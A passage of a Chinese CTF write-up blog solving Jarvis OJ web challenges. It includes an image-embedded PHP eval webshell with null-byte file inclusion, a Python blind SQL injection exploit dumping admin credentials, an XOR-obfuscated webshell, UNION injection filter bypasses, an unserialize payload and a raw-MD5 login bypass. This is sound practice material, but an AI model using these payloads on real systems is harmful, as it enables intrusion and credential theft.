<p>结果报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Warning: fopen(view&apos;.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24</div><div class="line">No such file!</div></pre></td></tr></table></figure></p>
<p>所以这里应该有文件包含漏洞。结合submit的图片上传功能，可以猜想我们上传一个图片马，然后再去包含它。用edjpgcom制作图片，插入的一句话为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&apos;c&apos;]);&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>若是直接用&lt;?php … ?&gt;，会失败，应该是服务器端做了过滤。上传后得到id。之后通过view功能得到图片的地址为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32785/uploads/1499355842.jpg</div></pre></td></tr></table></figure></p>
<p>利用文件包含功能，加上%00截断绕过，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32785/index.php</div><div class="line">?page=uploads/1499355842.jpg%00</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CTF&#123;upl0ad_sh0uld_n07_b3_a110wed&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><p>盲注。用户名处存在注入。根据是<code>用户名错误</code>还是<code>密码错误</code>来进行判断。过滤了空格，and，or。</p>
<ul>
<li>过滤空格，可以用tab键绕过 %09</li>
<li>过滤or，可以用<code>||</code>来替代</li>
</ul>
<p>附上exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://web.jarvisoj.com:32787/login.php"</span></div><div class="line">	<span class="comment"># parm = &#123;"username":payload,"password":"bb","submit":""&#125;</span></div><div class="line">	headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">	parm = <span class="string">"username="</span>+payload+<span class="string">"&amp;password=bb"</span></div><div class="line">	content = requests.post(url,data=parm,headers=headers,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line"><span class="comment"># def generatePayload():</span></div><div class="line"></div><div class="line">cuowu = <span class="string">'\u7528\u6237\u540d\u9519\u8bef'</span>.decode(<span class="string">'unicode_escape'</span>)</div><div class="line"><span class="comment"># print cuowu</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"tables"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x696e6a656374696f6e)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"columns"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x61646d696e)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"data"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(id,0x3a,username,0x3a,password%09SEPARATOR%090x3c62723e)%09FROM%09admin)"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">"a' || (ascii(substr("</span>+generateTarget(target) +<span class="string">","</span>+ str(i) +<span class="string">",1))&lt;="</span>+str(midNum) +<span class="string">")%23"</span></div><div class="line">		<span class="comment"># print payload</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="comment"># print recv</span></div><div class="line">		<span class="keyword">if</span> cuowu <span class="keyword">in</span> recv:</div><div class="line">			<span class="comment"># print 'cuowu'</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="comment"># print 'chenggong'</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			<span class="comment"># print rightNum</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line"></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The database:"</span></div><div class="line">	target = <span class="string">"database"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The tables:"</span></div><div class="line">	target = <span class="string">"tables"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The columns:"</span></div><div class="line">	target = <span class="string">"columns"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The data:"</span></div><div class="line">	target = <span class="string">"data"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/12.jpg?raw=true" alt=""></p>
<p>密码进行md5解密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">334cfb59c9d74849801d5acdcfdaadc3  =&gt; eTAloCrEP</div></pre></td></tr></table></figure></p>
<p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CTF&#123;s1mpl3_1nJ3ction_very_easy!!&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><p>题目地址：<a href="http://web.jarvisoj.com:32782/" target="_blank" rel="external">http://web.jarvisoj.com:32782/</a><br>题目描述：小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？</p>
<p>查看源代码，图片的插入方式比较奇怪，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg</div></pre></td></tr></table></figure></p>
<p>点击管理员登陆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32782/admin</div></pre></td></tr></table></figure></p>
<p>查看源代码得到提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--&lt;script&gt;alert(&apos;admin ip is 103.27.76.153&apos;)&lt;/script&gt;--&gt;</div></pre></td></tr></table></figure></p>
<p>结合前面图片的插入方式，我们构造下面链接访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32782/proxy.php?url=http://103.27.76.153/proxy.php?url=http://web.jarvisoj.com:32782/admin/</div></pre></td></tr></table></figure></p>
<p>通过扫描器知admin目录下有robots.txt，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">User-agent: *</div><div class="line">Disallow:trojan.php</div><div class="line">Disallow:trojan.php.txt</div></pre></td></tr></table></figure></p>
<p>其中trojan.php.txt的内容是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;=(<span class="string">"!"</span>^<span class="string">"`"</span>).(<span class="string">"( "</span>^<span class="string">"&#123;"</span>).(<span class="string">"("</span>^<span class="string">"["</span>).(<span class="string">"~"</span>^<span class="string">";"</span>).(<span class="string">"|"</span>^<span class="string">"."</span>).(<span class="string">"*"</span>^<span class="string">"~"</span>);$&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;((<span class="string">"-"</span>^<span class="string">"H"</span>). (<span class="string">"]"</span>^<span class="string">"+"</span>). (<span class="string">"["</span>^<span class="string">":"</span>). (<span class="string">","</span>^<span class="string">"@"</span>). (<span class="string">"&#125;"</span>^<span class="string">"U"</span>). (<span class="string">"e"</span>^<span class="string">"A"</span>). (<span class="string">"("</span>^<span class="string">"w"</span>).(<span class="string">"j"</span>^<span class="string">":"</span>). (<span class="string">"i"</span>^<span class="string">"&amp;"</span>). (<span class="string">"#"</span>^<span class="string">"p"</span>). (<span class="string">"&gt;"</span>^<span class="string">"j"</span>). (<span class="string">"!"</span>^<span class="string">"z"</span>). (<span class="string">"T"</span>^<span class="string">"g"</span>). (<span class="string">"e"</span>^<span class="string">"S"</span>). (<span class="string">"_"</span>^<span class="string">"o"</span>). (<span class="string">"?"</span>^<span class="string">"b"</span>). (<span class="string">"]"</span>^<span class="string">"t"</span>));<span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>上述代码保存为php页面运行一下，得到Warning：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Warning: assert() [function.assert]: Assertion &quot;eval($_POST[360])&quot; failed in C:\phpstudy\WWW\b.php on line 1</div></pre></td></tr></table></figure></p>
<p>所以，webshell密码为360。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/10.jpg?raw=true" alt=""></p>
<p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CTF&#123;fl4g_1s_my_c40d40_1s_n0t_y0urs&#125;</div></pre></td></tr></table></figure></p>
<h1 id="IN-A-mess"><a href="#IN-A-mess" class="headerlink" title="IN A mess"></a>IN A mess</h1><p>题目地址：<a href="http://web.jarvisoj.com:32780/index.php?id=1" target="_blank" rel="external">http://web.jarvisoj.com:32780/index.php?id=1</a></p>
<p>访问并查看源代码，发现提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--index.phps--&gt;work harder!harder!harder</div></pre></td></tr></table></figure></p>
<p>访问index.phps，得到源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</div><div class="line">&#123;</div><div class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</div><div class="line">	<span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">$id=$_GET[<span class="string">'id'</span>];</div><div class="line">$a=$_GET[<span class="string">'a'</span>];</div><div class="line">$b=$_GET[<span class="string">'b'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</div><div class="line">&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</div><div class="line">	<span class="keyword">return</span> ;</div><div class="line">&#125;</div><div class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</div><div class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>php弱类型绕过。当<code>$a</code>为php://input，<code>$data</code>可以通过php://input来接受post数据。<code>$id</code>传一个字符进去，会被转换为0。对<code>$b</code>，要求长度大于5，其次要求满足<code>eregi</code>的要求和首字母不为4。可以设置<code>$b</code>为<code>%00111111</code>，这样，substr（）会发生截断，在匹配时时进行eregi(“111”,”1114”)满足，同时%00对strlen不会发生截断。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170707/1.jpg?raw=true" alt=""></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32780/^HT2mCpcvOLf</div></pre></td></tr></table></figure></p>
<p>发现链接自动补全，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1</div></pre></td></tr></table></figure></p>
<p>猜测是注入。注入过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/ununionion/*123*/selselectect/*123*/1,2,3#</div></pre></td></tr></table></figure></p>
<p>字段数为3。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/ununionion/*123*/selselectect/*123*/1,2,database()#</div></pre></td></tr></table></figure>
<p>得到数据库名:test</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374#</div></pre></td></tr></table></figure>
<p>得到表名：content</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74#</div></pre></td></tr></table></figure>
<p>得到字段名：id,context,title</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(id,0x3a,context,0x3a,title,0x3a)/*123*/frfromom/*111*/content#</div></pre></td></tr></table></figure>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125;</div></pre></td></tr></table></figure></p>
<h1 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h1><p>打开页面后查看源代码，发现插入图片的位置处是base64加密结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</div></pre></td></tr></table></figure></p>
<p>将<code>index.php</code>经base64加密后得到<code>aW5kZXgucGhw</code>尝试访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</div></pre></td></tr></table></figure></p>
<p>得到index.php源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</div><div class="line">	$x = <span class="keyword">new</span> Shield();</div><div class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</div><div class="line">		$x = unserialize($g);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>看到里面有个<code>shield.php</code>，尝试用前面的套路去读取：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="comment">//flag is in pctf.php</span></div><div class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</div><div class="line">		<span class="keyword">public</span> $file;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </div><div class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</div><div class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>用以下脚本生成序列化串<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Shield &#123;</div><div class="line">		public $file = &quot;pctf.php&quot;;</div><div class="line">	&#125;</div><div class="line">	$chybeta = new Shield();</div><div class="line">	print_r(serialize($chybeta));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125;</div></pre></td></tr></table></figure></p>
<p>查看源代码，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</div></pre></td></tr></table></figure></p>
<p>顺便附上showimg.php的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$f = $_GET[<span class="string">'img'</span>];</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</div><div class="line">		$f = base64_decode($f);</div><div class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></div><div class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</div><div class="line">			readfile($f);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p>随便填一个密码。抓包得到提示：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/9.jpg?raw=true" alt=""></p>
<p>要注入下列sql语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</div></pre></td></tr></table></figure></p>
<p>关键在<code>md5($pass,true)</code>，若<code>$pass</code>的值为ffifdyop，则经过md5转换后的值再经过php转为字符串后会变成<code>&#39;or&#39;6蒥欓!r,b</code>，6的后面是一堆乱七八糟的字符，姑且记为xx吧。则最后的sql查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from `admin` where password=&apos;&apos;or&apos;6蒥欓!r,b&apos;</div></pre></td></tr></table></figure></p>
<p>成功闭合前面的单引号。填入password，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PCTF&#123;R4w_md5_is_d4ng3rous&#125;</div></pre></td></tr></table></figure></p>
<p>更多内容可见：<a href="http://www.joychou.org/index.php/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="external">SQL injection with raw MD5 hashes</a></p>
<h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p>直接改X-Forwarded-For为127.0.0.1。得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;</div></pre></td></tr></table></figure></p>
<h1 id="PORT-51"><a href="#PORT-51" class="headerlink" title="PORT 51"></a>PORT 51</h1><p>用vps来请求，不然经过路由后可能请求端口就变了。在vps上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ sudo curl --local-port 51 http://web.jarvisoj.com:32770/</div><div class="line">[sudo] password for ubuntu:</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Web 100&lt;/title&gt;</div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">	body &#123;</div><div class="line">		background:gray;</div><div class="line">		text-align:center;</div><div class="line">	&#125;</div><div 